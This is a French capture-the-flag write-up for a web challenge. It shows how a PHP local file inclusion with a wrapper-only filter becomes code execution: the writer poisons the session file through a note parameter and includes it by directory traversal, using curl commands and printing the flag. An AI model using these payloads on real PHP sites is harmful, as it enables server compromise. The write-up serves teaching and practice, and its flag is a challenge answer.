# Le Filtre Magique

Web · 500 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

La page inclut le fichier donné dans `?page=`. Didier a ajouté un filtre contre les wrappers PHP (`php://`, `data://`,
`http:`…), mais pas contre les chemins relatifs. On ne peut pas lire n'importe quoi directement, mais on peut faire inclure
un fichier qui contient du PHP, et le faire exécuter.

Un tel fichier existe déjà sur le serveur : le fichier de session. Le paramètre `?note=` est stocké dans la session, et PHP
écrit chaque session dans un fichier sur le disque. On y glisse donc un peu de code via `?note=`, puis on inclut ce fichier
par traversée de répertoire grâce à `?page=`.

```bash
B=https://filtre-magique.cyberzerk.fr
curl -s -c j "$B/?note=%3C%3Fphp+system('cat+/flag.txt+/tmp/flag.txt+2%3E/dev/null')%3B%3F%3E" > /dev/null
SID=$(grep -o 'PHPSESSID[[:space:]].*' j | awk '{print $NF}')
curl -s -b j "$B/?page=../../../tmp/sess/sess_$SID"
```

Le code PHP collé dans la note se retrouve exécuté dès que la page inclut le fichier de session, puisque PHP interprète
tout `<?php ?>` qu'il rencontre, même dans un fichier qui n'est pas censé en contenir. La commande regarde les deux
emplacements possibles du flag ; au besoin, un `find / -name flag.txt 2>/dev/null` le localise.

**Flag :** `CyberZerk{LFI_c0ntr41nt3_p01s0n_d3_s3ss10n_v3rs_rc3}`
